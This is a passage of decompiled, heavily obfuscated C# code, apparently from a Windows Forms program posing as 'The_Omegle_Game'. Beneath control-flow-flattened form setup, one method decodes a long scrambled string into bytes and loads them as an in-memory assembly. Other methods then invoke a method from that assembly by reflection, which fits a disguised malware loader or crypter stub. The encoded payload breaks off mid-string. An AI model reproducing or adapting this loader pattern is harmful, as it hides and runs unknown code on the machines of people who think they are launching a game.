					num = (int)((num2 * 1545867170) ^ 0x3BF714BC);
					continue;
				case 41u:
					num = (int)((num2 * 2012418885) ^ 0x332C0D5A);
					continue;
				case 40u:
					GForm1.smethod_50(PictureBox_2, bool_3: false);
					num = (int)((num2 * 719288480) ^ 0x60C648B);
					continue;
				case 39u:
					num = (int)((num2 * 1370962391) ^ 0x5B968177);
					continue;
				case 38u:
					num = ((int)num2 * -463382316) ^ -1104214549;
					continue;
				case 37u:
					num = ((int)num2 * -1600682586) ^ -567151249;
					continue;
				case 36u:
					GForm1.smethod_48((Control)(object)PictureBox_3, new Size(329, 59));
					num = (int)((num2 * 1961552721) ^ 0x32700134);
					continue;
				case 35u:
					num = ((int)num2 * -1142752944) ^ 0x1C4C18;
					continue;
				case 34u:
					num = (int)(num2 * 98792160) ^ -1500302440;
					continue;
				case 33u:
					num = (int)(num2 * 1442396101) ^ -1162928773;
					continue;
				case 32u:
					GForm1.smethod_44((Control)(object)PictureBox_3, Color.Transparent);
					GForm1.smethod_46((Control)(object)PictureBox_3, new Point(337, 343));
					num = (int)(num2 * 1639893396) ^ -166919448;
					continue;
				case 31u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_0);
					num = ((int)num2 * -360279391) ^ -662523421;
					continue;
				case 30u:
					num = ((int)num2 * -417391437) ^ 0x771C1EC3;
					continue;
				case 29u:
					GForm1.smethod_48((Control)(object)PictureBox_1, new Size(303, 65));
					num = (int)(num2 * 1643223077) ^ -2133112284;
					continue;
				case 27u:
					num = (int)((num2 * 144956326) ^ 0x5DE43433);
					continue;
				case 26u:
					GForm1.smethod_66((Control)(object)this, bool_3: false);
					num = (int)(num2 * 123134734) ^ -1922609440;
					continue;
				case 25u:
					num = (int)((num2 * 914977329) ^ 0x372C4866);
					continue;
				case 24u:
					GForm1.smethod_53((Form)(object)this, Color.White);
					num = (int)(num2 * 1838266741) ^ -1796432376;
					continue;
				case 23u:
					GForm1.smethod_58((Control)(object)this, GForm1.smethod_57("Consolas", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
					num = (int)((num2 * 290171066) ^ 0x4372E70F);
					continue;
				case 22u:
					GForm1.smethod_44((Control)(object)PictureBox_4, Color.Transparent);
					num = ((int)num2 * -949748409) ^ -1690482966;
					continue;
				case 21u:
					num = (int)(num2 * 1497662810) ^ -1624468777;
					continue;
				case 20u:
					num = (int)((num2 * 1017427354) ^ 0x17AE3B03);
					continue;
				case 19u:
					num = (int)((num2 * 161659389) ^ 0x2747EB44);
					continue;
				case 18u:
					GForm1.smethod_45((Control)(object)this, (ImageLayout)3);
					num = (int)((num2 * 540363427) ^ 0x52B7FA9F);
					continue;
				case 17u:
					num = (int)((num2 * 1636485245) ^ 0x33DE4E17);
					continue;
				case 16u:
					GForm1.smethod_50(PictureBox_1, bool_3: false);
					num = ((int)num2 * -168334661) ^ 0x5BAD00DD;
					continue;
				case 14u:
					num = ((int)num2 * -1075146728) ^ -246803895;
					continue;
				case 13u:
					GForm1.smethod_50(PictureBox_0, bool_3: false);
					num = ((int)num2 * -728458129) ^ 0xDFC4BD5;
					continue;
				case 12u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_3);
					GForm1.smethod_42((ISupportInitialize)PictureBox_4);
					num = ((int)num2 * -371718941) ^ -1574326242;
					continue;
				case 11u:
					GForm1.smethod_48((Control)(object)PictureBox_2, new Size(329, 59));
					num = ((int)num2 * -1040209042) ^ 0x491A7C20;
					continue;
				case 10u:
					PictureBox_0 = GForm1.smethod_40();
					Timer_0 = GForm1.smethod_41(icontainer_0);
					num = ((int)num2 * -1604534773) ^ -1496660687;
					continue;
				case 9u:
					num = (int)(num2 * 1010627359) ^ -794711120;
					continue;
				case 8u:
					GForm1.smethod_43((Control)(object)this);
					num = ((int)num2 * -2004404425) ^ -1289645210;
					continue;
				case 7u:
					GForm1.smethod_44((Control)(object)PictureBox_1, Color.Transparent);
					GForm1.smethod_46((Control)(object)PictureBox_1, new Point(349, 198));
					num = (int)((num2 * 123370433) ^ 0x31D71D26);
					continue;
				case 6u:
					GForm1.smethod_47((Control)(object)PictureBox_3, smethod_5(bool_3: true));
					num = (int)((num2 * 1829632470) ^ 0x672B7DA0);
					continue;
				case 5u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_3);
					num = ((int)num2 * -1360241236) ^ -1049971714;
					continue;
				case 4u:
					num = ((int)num2 * -150875883) ^ 0x40655619;
					continue;
				case 3u:
					GForm1.smethod_49(PictureBox_2, 2);
					num = (int)(num2 * 1730325504) ^ -8725129;
					continue;
				case 2u:
					GForm1.smethod_49(PictureBox_0, 0);
					num = ((int)num2 * -1612371173) ^ -943900641;
					continue;
				case 1u:
					GForm1.smethod_44((Control)(object)PictureBox_0, Color.Transparent);
					num = (int)(num2 * 962312742) ^ -260844750;
					continue;
				case 0u:
					GForm1.smethod_47((Control)(object)PictureBox_4, "PictureBox5");
					num = (int)(num2 * 1016324185) ^ -16476381;
					continue;
				default:
					return;
				case 15u:
					break;
				case 28u:
					return;
				}
				break;
			}
		}
	}

	private static void smethod_1(Type type_0, int int_2)
	{
		object[] array = default(object[]);
		MethodInfo object_ = default(MethodInfo);
		while (true)
		{
			int num = -492452486;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF07B0E07u) % 4u)
				{
				case 1u:
					array = new object[3]
					{
						GClass2.String_1,
						GClass2.String_0,
						"The_Omegle_Game"
					};
					num = ((int)num2 * -545087185) ^ 0x3573F4D4;
					continue;
				case 0u:
					object_ = GForm1.smethod_67(type_0)[3];
					num = (int)(num2 * 1505525279) ^ -1081523015;
					continue;
				case 3u:
					break;
				default:
					GForm1.smethod_68((object)object_, "Invoke", (CallType)2, new object[2] { 0, array });
					return;
				}
				break;
			}
		}
	}

	private static void smethod_2(Assembly assembly_0)
	{
		int num = 251367102;
		bool flag = default(bool);
		Type type_ = default(Type);
		while (true)
		{
			int num2 = 740099683;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x593F58AAu) % 13u)
				{
				case 12u:
					num2 = (int)((num3 * 1628789289) ^ 0x6A8E598D);
					continue;
				case 11u:
					num2 = (int)((num3 * 18470500) ^ 0x7273505B);
					continue;
				case 10u:
					flag = num == 251367199;
					num2 = ((int)num3 * -547371589) ^ 0x532DEBE7;
					continue;
				case 9u:
				{
					int num6;
					if (num == 251367142)
					{
						num2 = 272505492;
						num6 = 272505492;
					}
					else
					{
						num2 = 2034747542;
						num6 = 2034747542;
					}
					continue;
				}
				case 8u:
					num2 = ((int)num3 * -1164504183) ^ -1666453148;
					continue;
				case 6u:
					num2 = 324669457;
					continue;
				case 5u:
					type_ = GForm1.smethod_69(assembly_0)[0];
					num2 = ((int)num3 * -1807577394) ^ -352543245;
					continue;
				case 4u:
					num = 251367188;
					num2 = (int)(num3 * 816796523) ^ -671690669;
					continue;
				case 3u:
					smethod_1(type_, 5);
					num = 251367134;
					num2 = (int)((num3 * 1446172055) ^ 0x5E92607A);
					continue;
				case 2u:
					num = 251367129;
					num2 = ((int)num3 * -1909917936) ^ 0x4AFF0A1E;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 1877278941;
						num5 = 1877278941;
					}
					else
					{
						num4 = 713235661;
						num5 = 713235661;
					}
					num2 = num4 ^ ((int)num3 * -1624819298);
					continue;
				}
				default:
					return;
				case 0u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly smethod_3(byte[] byte_0, bool bool_3)
	{
		return GForm1.smethod_70(byte_0);
	}

	public static string smethod_4(string string_0)
	{
		string string_3 = default(string);
		int num3 = default(int);
		string text = default(string);
		string string_2 = default(string);
		string string_ = default(string);
		string result = default(string);
		while (true)
		{
			int num = 484650848;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBC57F63u) % 11u)
				{
				case 10u:
					string_3 = string_0;
					num3 = 0;
					num = ((int)num2 * -489141660) ^ 0x7A83AA15;
					continue;
				case 7u:
					text = null;
					num = ((int)num2 * -472261849) ^ -1920984750;
					continue;
				case 6u:
					string_2 = GForm1.smethod_72(GForm1.smethod_71(string_3, num3));
					num = 1464839607;
					continue;
				case 5u:
				{
					int num4;
					if (num3 < GForm1.smethod_75(string_3))
					{
						num = 1111420356;
						num4 = 1111420356;
					}
					else
					{
						num = 993798121;
						num4 = 993798121;
					}
					continue;
				}
				case 4u:
					num = ((int)num2 * -582229260) ^ 0x7097F85;
					continue;
				case 3u:
				{
					int int_ = checked(GForm1.smethod_73(string_2) - 670);
					string_ = GForm1.smethod_72(GForm1.smethod_74(int_));
					num = ((int)num2 * -820463767) ^ 0x2E340346;
					continue;
				}
				case 2u:
					num3 = checked(num3 + 1);
					num = (int)((num2 * 446645906) ^ 0x16B61FD1);
					continue;
				case 1u:
					result = text;
					num = (int)(num2 * 2045284191) ^ -535147190;
					continue;
				case 0u:
					text = GForm1.smethod_14(text, string_);
					num = ((int)num2 * -1225181078) ^ -370814158;
					continue;
				case 8u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static string smethod_5(bool bool_3)
	{
		string string_ = default(string);
		Assembly object_ = default(Assembly);
		string text = default(string);
		string result = default(string);
		while (true)
		{
			int num = -749625719;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9755534Bu) % 7u)
				{
				case 6u:
				{
					object obj = GForm1.smethod_78(smethod_6(GForm1.smethod_77(string_)));
					object_ = smethod_3((byte[])obj, bool_3: true);
					num = (int)(num2 * 184748704) ^ -746504260;
					continue;
				}
				case 5u:
					text = GForm1.smethod_76("\u02f2\u02f4\u030f\u02ef\u200c??\u02eb\u200c??\u200c????\u200c??\u200c??????\u02d6\u200c??\u02ea\u0305\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u02df\u02d2\u0304\u0313\u0305\u02d2\u02df\u0312\u02df\u030c??\u02e7\u0300\u0305??\u02f2\u02eb??\u0306\u02f4\u02e5\u0306\u030e\u0301\u0317??\u0315\u0301\u030b\u02d7\u030c\u0301\u030b??\u0312\u02e7\u02e5??\u0306\u0300\u030b\u02d3\u0314\u0302????\u0307\u02f8\u02f1??\u0317\u0302\u02f5\u02d2\u0305\u02ff\u02f5\u02d2\u0305\u02f0??\u02d7\u02f2\u02e7\u02e5??\u0314\u02f8\u02e5\u02f3\u0313??\u02ef??\u02e9\u02e8\u200c??\u200c??\u200c??\u200c??\u02df??\u02ef\u02f0\u02ef\u200c??\u02f2\u02df????\u02df\u02e5??\u02e9\u030a\u02f5??\u200c??\u200c??\u200c??\u200c??\u200c??\u02ed\u200c??\u02df\u0307??\u02ea\u02df\u02ef\u0305\u200c????\u030d\u200c??\u200c??\u02e5\u200c??\u200c??\u200c??\u200c????\u030a\u0305\u200c??\u200c??\u0305\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u0305\u200c??\u200c??\u02df\u0305\u200c????\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c????\u0305\u200c??\u200c??\u02df\u0305\u200c??\u200c??\u200c??\u200c??\u02eb\u02df\u02ef\u02e7\u02f3\u200c????\u200c??\u02df??\u200c??\u200c??\u200c????\u200c??\u02df??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ea\u0316\u02f6\u200c??????\u200c??\u200c??\u02df\u02e5\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u0315\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e7\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df????\u200c??\u02df??\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02d3??\u02f8\u02f6\u0306??\u200c??\u200c??????\u0305\u200c??\u200c??\u0305\u200c??\u200c??\u02ed\u0305\u200c??\u200c??\u02e7\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u02df\u02e5\u02df\u0313\u0301\u030c??\u0317\u02f7\u0315\u200c??\u200c??\u02df??\u200c??\u200c??\u02f7\u200c??\u200c??\u02df\u02ef\u200c??\u200c??\u02d6\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u02df??\u02df\u02ea\u030c\u02e8\u030a\u0300\u02e5\u02d7\u0308\u200c??\u02df\u02eb\u200c??\u200c??\u02df\u02e7\u200c??\u200c??\u02df??\u200c??\u200c??\u02ef\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02ef\u200c??\u02df\u02ef\u0305\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u0315\u02f4\u0315\u200c??\u200c??\u200c??\u02df??\u0305\u200c??\u200c????\u200c??\u02f3\u02df\u02f7??\u02f7\u200c????\u0315\u02f0\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02f7\u0305\u0301\u0305\u02e7\u200c??\u02e7????\u200c??\u02df??\u02e8\u0302\u02df??\u200c??\u02df??\u02e9\u02df??\u200c??\u02df\u030f\u200c??\u0305\u200c????????\u0311\u02df\u02ef\u200c??\u0308\u02ef??\u200c??\u02df??\u030a??\u02df\u02eb\u200c??\u02df\u02ef\u030d\u02df\u02ef\u200c????\u030d\u02df??\u200c??\u02df??\u02e9\u0305\u200c??\u02e5\u0318\u02df\u02e5\u02df??\u0311??\u200c??\u02df??\u200c??\u02df\u02f0\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u02d2\u0310\u02e8\u0306??\u02e6\u02f0\u02ef\u02f3\u200c??\u200c??\u02ea\u200c??\u200c????\u0315\u200c??\u200c??\u0311\u200c??\u200c??\u02ea\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u200c??\u02df\u02e5\u02e8\u0306\u0301\u02f2??\u0317\u0314\u02ff\u02df\u030c\u02eb??\u200c??\u02df\u02e9??\u0306\u030d\u02f2??\u02f0??\u02e8\u02f0\u02ef\u02f7\u200c??\u200c??\u030f\u200c??\u200c??\u02e8\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u030a\u200c??\u200c??\u200c??\u200c??\u02df??\u030d\u200c??\u200c??\u02ff\u0308\u02ef\u0305\u200c??\u02df??\u02ea??\u030c\u02f3\u02e6\u200c??\u02df??????\u02f3??\u200c??\u02df\u0300??\u0306\u030d\u0305\u02d5\u0305??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df??\u200c????\u0311\u030b\u02e5\u0316\u02eb\u02e8\u02e9\u02d5\u0301\u02e6\u0302\u02df??\u200c????\u0311\u02f5\u02e7\u02df\u02e7??\u200c??\u02df\u0305\u02f5\u0305??\u200c????\u0305\u02f1\u200c??\u02df\u02e5??\u02df\u02f8????\u0315\u200c??\u02df\u02f0\u02f8\u0318\u02df\u0315\u200c????\u0305??\u02f8??\u0315\u0311\u02f0????\u02f3\u02e5\u200c??\u200c??\u02ea\u200c??\u200c??\u200c??\u200c??\u200c??\u0311\u200c??\u200c??\u200c??\u200c??\u02df??\u0315\u200c??\u200c??\u200c??\u200c??\u02df??\u02e7??\u02e7\u200c??\u02df????\u0315\u02ef\u02e8\u0302\u02df\u0309\u200c??\u02df??\u02f0??\u02e6\u02f3??\u200c??\u02df\u0300??\u0305\u0305\u0305\u0308\u0305??\u200c??????\u0307\u02df\u02ef\u200c??\u02e9\u02df??\u200c????\u0311\u030b\u02e5\u0306\u02eb\u02ea\u02e9\u02d5\u02f3\u02f0??\u02e6\u02f3??\u200c??\u02df\u0300??\u0315\u02f6\u0302\u0318\u200c??\u200c????\u0305\u02f2??\u02f0????\u02f0\u02ef\u0301\u200c??\u200c??\u200c??\u200c??\u02df\u02f0\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u030d\u200c??\u200c??\u030f\u200c??\u200c????\u02f6\u02f3\u02e8\u200c??\u02df??\u02ea??\u02e7\u02f0??\u0307????\u02df\u02ef\u200c??\u0309\u0317\u02df\u02ef??\u0315\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d6\u02eb\u02f0??\u0307??\u0308\u02df\u02ef\u200c??\u0309\u0317????\u0313\u0315\u200c??\u02f5\u02f1\u0314\u0311??\u02f6\u02f3\u02e8\u200c??\u02df??\u0300\u0315\u02ef\u200c??\u02df\u030d\u02f0??\u0306\u02d7\u02f4\u0309\u0317??\u0302??\u02ef\u200c??\u02f5\u02f0\u02eb??\u02e9\u02d3\u030c\u0301\u02e5??\u02eb\u02ef??\u02f0??????\u0315\u200c??\u02df????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u030d\u200c??\u200c??\u02e5\u0302\u02df\u0301\u200c??\u02df??\u0311??\u0306??\u02ed\u02e7\u02e7\u02f7??\u200c????\u02f2\u02e7??\u0304\u0314\u200c????\u02f8??\u0316\u02df\u0310\u0315\u0316\u0315\u0310??\u02ef\u02f8????\u0315\u200c??\u02df\u02f5\u02d6??\u200c??\u02df\u02e9??\u02f0??\u0305\u02e9\u02df\u02e7\u200c??\u02e8\u02eb\u0305\u02df??\u02f3\u200c????\u0309\u02f2????\u0313\u0308????\u02f7\u02f2??\u0316??\u02f2\u02f0\u02ef\u02f3\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????????\u0302\u02ef??\u200c????\u0311\u030f\u02df??????\u200c??\u02df??\u200c??\u200c??\u0310\u02ef\u200c??\u02df??\u0315\u200c??\u200c??\u02e8\u02df\u02ef\u200c??\u02ff\u0315\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c????\u02ef\u200c??\u02df??\u0301??\u200c??????\u02df\u02ef\u200c??\u02f7\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u02f2\u02eb\u02df\u02f3\u02df\u030c\u0305??\u200c??\u02df\u02e7\u200c??????????\u200c??\u02df????\u02eb\u02e9\u0304\u0305\u02e7\u200c??\u02df\u02ef\u02f2??\u0317\u0312\u02f5??\u02ef\u030a????\u02ef\u200c??\u02df??\u02ef??\u200c????\u030b\u200c??\u200c??\u200c??\u200c??\u02df\u02ed\u02f7\u200c??\u200c??\u02ea\u200c??\u200c????\u0305\u200c??\u02df\u02e6\u02f7\u200c??\u02df????\u200c??\u200c??\u02e7\u0315??\u200c????\u200c??\u200c??\u02df\u02d5\u02df\u02ef\u200c??\u02f4\u200c??\u200c??\u02e5\u02ef\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u0315\u200c??\u02df\u02e8\u02eb\u200c??\u02df??\u02ef\u200c??\u200c????\u02df\u02eb\u200c??\u02df\u02f7\u030b\u02e5\u0306\u02eb\u02e8\u02e9\u02d4\u030d\u0305\u0301\u02df\u02e7\u200c????\u02df\u02e9\u02df\u0305\u200c??\u02e9??\u02ef\u200c??\u02df\u02f7??\u02e7\u02ea\u02d6\u200c??\u200c??\u0305\u030f\u02ef\u200c??\u02df??\u0305??\u200c??\u02df\u0310??\u0306??\u02e9\u02e7????\u200c??\u02df??\u02f2\u02e7\u02e7\u02f2\u0310\u200c????\u02f8??\u0315\u0309\u02d2\u0302\u0304??????\u0315\u02e7??\u0308\u030b\u0309\u02f6\u02f5\u02f8??\u0304\u0301\u02e5??\u02ea\u02e6\u0315\u0311\u02f2??\u02f2\u0306\u0306????????\u02df\u030d\u02d3\u030e????\u0307????\u200c??\u200c??\u02ef\u0315\u02f5??\u02f0\u02f7\u02f2??????\u02ea\u02e6??\u02f1\u02f2\u02e7\u02e7\u02df\u02f8\u200c????\u02f8??\u0315\u0309\u02d2??????????\u0315\u0305\u02f0??\u02df\u02e7\u02f0??\u02e8??\u02e6\u02f7\u02ef\u02f8??\u02df\u02ef\u200c??\u02e5\u0315\u030b\u02f0\u02f7\u0302\u02e9\u0301\u02e6\u0315\u02d6\u02f2??\u02f2\u0305\u0307??????????\u02ef\u02eb\u0305??\u0315\u02e7\u200c????????\u02df\u0305\u200c??\u02e9\u02df\u02eb\u200c????\u0311\u02f6\u02f5\u0304\u02d2????\u0315\u02f3\u0304??\u0306\u02eb\u02e8\u02ed\u02df\u02ea??????\u02d6\u02f0??\u02f1\u0315\u02e8\u02e6\u0316\u02df\u02f2??\u02f2\u0308????\u0314??????\u02ef\u0311\u0305\u02ff\u0315??\u200c??\u02e8\u02eb\u0305\u02d4\u0307\u030d\u200c????\u0309\u0310\u02d4\u02f0\u02f7??\u02e5\u02f0\u02eb\u02e8\u02ed??\u0314??????\u02d6\u02e8????\u0305??\u02e5\u02f0\u02eb\u02e8\u02ed\u02eb????????\u02d6\u02f0????\u0302\u02f7??\u0315\u02ef\u02f0??\u0316\u02d7\u02d6\u0309\u0317??\u0301\u02d2\u0315\u200c??\u02f5\u02f0\u02eb\u02e8\u02ed\u02ea\u0304??????\u02d6\u02f0??\u02df\u02e9\u02ed\u02ff\u02f0\u0302\u02f8??\u0305\u02e7\u02f5??\u0305??\u02f2??\u0306\u02f7\u02f2??\u02f2\u0307\u0306??\u0314??????\u02ef\u02f7\u0312????\u02d2\u02f2??\u02f2\u0307\u02f4??\u0314????\u02e6??\u0314????\u0305\u02e7??\u0308\u030b\u0309\u02f6\u02f5\u02f1\u0305??\u200c??\u02df\u0310????\u02eb\u02e6\u02e6\u0315\u030d\u02f2??\u02f2\u0306\u02d4??\u0314??????\u02ef\u0302??\u02df\u02ef\u200c??\u02e5\u0317\u030d\u200c????\u02eb\u0315??\u200c????\u02df\u0305\u200c??\u02df\u0315\u200c????\u02f6\u02d2??\u200c??\u02df????\u0315\u0316??\u02df\u0305\u200c??????\u02eb??\u02e9??\u0315\u02f0????\u02f3\u02ef\u200c??\u200c??\u02f5\u0305??\u200c????\u030d??\u200c????\u200c??\u200c??\u02df\u0307\u0305??\u200c??\u02e6????\u200c????\u02e9\u02df\u02ef\u200c??\u0318\u0315\u200c??\u02df\u02ea\u0315??\u200c??????\u200c??\u200c??\u200c??\u200c??\u02df\u02e8\u0301??\u200c????\u0311\u200c??\u200c??\u02e5\u0315\u200c??\u02df\u02e5\u02eb??\u200c??\u02df\u02f4\u200c??\u200c??\u02f4\u0315\u200c??\u02df??\u02df??\u200c??\u02df\u02e5\u02e8\u0306??\u02eb\u02e6\u0317\u02d4\u02f2\u02e7??\u0312??\u200c????\u02f8??\u0315\u0311\u0310\u030e\u02e6\u02eb\u02e5\u200c??\u02df\u02e9??\u0305\u02e7\u0305\u0305\u0315\u02e7\u200c??????\u0310\u02df\u0305\u200c??\u02e9\u02df\u02f3\u200c????\u0311\u02f6??\u0305\u0311\u02f0????\u02d6\u02ed\u0309\u0317\u02df\u02f0\u02f0\u0315\u200c??\u02f5\u02f0\u02eb\u02ea\u02ed\u02e6\u030c??????\u02d6\u02f5??????\u02eb\u02e7??\u02d2??\u200c????\u02f2\u02e7??\u02f4\u0307\u200c????\u02f8??\u0315\u0311\u02d2\u02f7\u0314??????\u0315\u02e7\u0305\u02f8\u02ef??\u200c????\u02df\u02eb\u02df\u02ef\u200c??\u02e9\u02df\u02f3\u200c????\u0311\u02f6??\u0305??\u02f5??\u0315\u02ef\u02f0??\u02f1\u02df\u0306\u02df\u02ef\u200c??\u0309\u0317????\u02f7\u02ef\u200c??\u02f5\u02f0\u02eb\u02ea\u02ed??\u0304??????\u02d6??????????\u02e7??\u02d6??\u200c??\u02df\u0305\u0314\u0305\u02e7\u200c????\u0305\u02e5\u200c??\u02df\u0310??\u0315\u02f3\u02f0??\u02f0\u02f7\u02f5??\u0306\u02f7\u0305\u0314\u0315??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df\u0315\u200c??\u02df\u02f7\u0305??\u02ef\u200c??\u02df????\u0313\u200c??\u200c??\u02e9??\u02f3\u200c??\u02df\u02f7\u02f2??\u0306??\u02eb\u02e6??\u030b\u02f2\u02e7??\u030c\u02f7\u200c????\u02f8??\u0315\u0311\u02d2\u02d4\u0314\u02d5????\u0316??\u02e5\u02ea??\u02f3\u02f0??????\u02f6\u02df\u02ef\u200c??\u0309\u0317??\u030f??\u200c??\u02df\u02f5\u02f0\u02eb\u02ea\u02ed??\u02e6??????\u02d6\u0304??\u02f1\u0314????\u030c\u02f3??\u200c??\u02df????\u030c\u02ef??\u200c??\u02df??\u02e7\u02eb\u02e7??\u200c??\u02df\u0305\u030b\u02df\u02eb\u200c????\u0305\u02e6\u200c??\u02df\u0310\u02e5\u02f7??\u02e7\u200c??\u02df??\u02e8\u02f0\u02f7\u02f1??\u02f0\u02d6\u0303\u02e6??\u02ef\u030d??\u02ef\u200c????\u030e\u0315\u030a??\u0316\u02e7??\u02e7\u02e7\u0309\u200c??\u200c??\u0305\u02d2\u0305\u200c??\u02df??\u0305??\u200c??\u02df\u02e5\u030c??\u02f3\u02f7??\u0305\u02f3\u0305\u0309\u0305??\u200c????????\u02df\u02ef\u200c??\u02e9\u02df??\u200c??\u02df\u02ff\u0301\u02e7\u02e9\u0315??\u200c??\u02df\u0305\u0307\u0315??\u200c????\u0305\u02e7\u200c??\u02df\u0310??\u0316\u02eb\u02ea\u02ed??????????\u02d6\u0304??\u02f0\u02eb\u02ea\u02ed??\u0300??????\u02d6\u02f0????\u0304\u02f5??\u0315\u02ef\u02ff??\u0315\u0311\u02d2\u02f1??\u02d5????\u0316??????\u0304\u02d2????\u0314\u02d2????\u0315\u0301\u02f0??\u0317??\u02e7\u02e5\u02f0\u02eb\u02ea\u02ed??\u02ea??????\u02d6\u0303\u02e9??\u02f7\u02e7??\u02d7\u02f7\u02eb\u02e6\u0315\u030d\u02f2??\u0318\u0305\u0307??\u0314??????\u02df\u0304??\u02df\u0306\u0300??\u02df\u02f0\u02eb\u02e7??\u02ef\u0305\u0312??????\u02f2??\u0318\u0305????\u0314??????\u02ef\u0315\u0305\u0314\u0305\u200c??\u02df\u02e8\u02eb\u0305\u030e\u0305\u200c??\u02df??\u0309\u0310\u02d4\u02ef\u02f8????\u0315\u200c??\u02df\u0302\u02df\u02e7\u200c??\u02df??\u02e9\u02df\u0301\u200c??\u02df\u030e\u0314??\u200c??\u02df??\u030c\u02ef??\u200c??\u02df\u0300??\u0315\u0309\u02f0??\u02f6\u02ef??\u200c??\u02df\u0300\u02e9\u0305\u02df\u02f2\u02eb\u02df\u02f3\u02df\u030a\u200c??\u200c??\u02df\u02ef\u200c??????????\u200c??\u02df????\u02eb??\u02e9\u0318\u02e7\u02e8\u02f0\u02ef\u02f7\u200c??\u200c??\u02f3\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u02f3\u200c??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c????\u02ef??\u02ef\u200c????\u0307\u02f7\u02f0????\u02d7\u02e6\u0309\u0317\u02df\u0309\u02f4\u02ef\u200c??\u02f5\u02ef??\u0310\u0318\u0305??\u02ef??\u0305\u200c??\u02df\u0307\u0305\u02e6\u200c??\u02df\u02e9\u02e7\u02df??\u02e8\u02d2??\u02ef\u0304??????\u030d??\u0305\u200c????\u0307??\u02f5\u200c??\u200c??\u02e7??\u02eb\u200c??\u200c??\u030d??\u02ef\u200c??\u02e9\u0317\u02df\u030c\u02df\u0305\u200c??\u02e7??\u0315??\u200c??\u02df\u030d??\u0315\u200c????\u030c\u02eb\u02e8\u200c??\u02df\u02e9??\u0306\u0309??\u02e9\u02d2\u02d2\u02e5\u0302\u02f0\u02f3\u200c??\u02df????\u0300\u0315\u030d\u200c??\u02df\u030e????\u02ef\u200c??\u02df\u02ef\u0311\u02e6\u0302????\u200c??\u02df??\u030f??\u0318\u02df\u02e6\u02df??\u02e7??\u200c??\u02df??\u200c??\u02df\u02f0\u0304\u0305\u02ef\u200c??\u02df\u02ef\u02f2??\u02f6\u02d2??\u200c??\u02df????\u0315\u030d\u0300??\u0315\u0305\u02f0????\u02f3\u02e7\u200c??\u200c??\u02e7\u02ef\u200c??\u02df??\u0315\u200c??\u02df????\u200c??\u200c??\u02f5\u0315\u200c??\u02df\u02ea\u0301\u200c??\u200c??\u200c??\u200c??\u02df\u02f5\u0315\u200c??\u02df\u02ea\u0301\u200c??\u200c??\u0305\u030c\u02e5\u02eb\u200c??????\u0309\u02df\u02ef\u200c??\u02e7??\u0305??\u200c??\u02df\u030d??\u02ef\u200c????\u0305\u02e7??\u02e9\u02df\u02f3\u200c??\u02df\u02f7\u02e9??\u0306\u02eb\u02e7\u02e9\u02d5\u0305\u02e5\u0302\u02f0??\u200c??\u02df??\u030d??\u200c??\u02df??\u0305\u0311\u02e6\u0302\u02df??\